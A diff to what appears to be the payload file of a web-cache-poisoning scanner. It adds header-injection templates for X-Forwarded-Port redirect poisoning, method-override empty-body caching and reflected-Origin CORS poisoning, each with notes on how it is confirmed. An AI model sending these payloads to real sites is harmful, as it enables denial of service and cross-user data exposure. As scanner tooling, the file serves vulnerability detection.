@@ -35,6 +35,18 @@ payloads:
     template: 'X-Argus-Canary: https://{oast_host}/{canary}'
     confidence: confirmed
     notes: Canary header; OAST callback confirms the URL is reflected & cached.
+  - id: x_forwarded_port
+    template: "X-Forwarded-Port: 1"
+    confidence: likely
+    notes: "Unkeyed X-Forwarded-Port poisons the cached 301 Location to a dead port (DoS); confirmed when a clean follow-up GET with no header returns the cached redirect pointing at the injected port (H1 #409370)."
+  - id: http_method_override_head
+    template: "X-HTTP-Method-Override: HEAD"
+    confidence: suspected
+    notes: "Method-cloaking: the backend honours the override and returns an empty body that a method-unaware cache stores under the GET key; confirmed when a clean GET of the asset replays the cached empty body (GitLab GCS #1160407)."
+  - id: origin_acao_reflect
+    template: "Origin: https://{oast_host}-{canary}"
+    confidence: likely
+    notes: "Unkeyed Origin is reflected into Access-Control-Allow-Origin and cached; confirmed when a clean cross-request returns the cached attacker ACAO marker, enabling cross-user reads or a CORS denial (reports/591302)."
 mutations:
   - name: case_flip
     description: Header-name case is irrelevant to HTTP but matters to some caches.
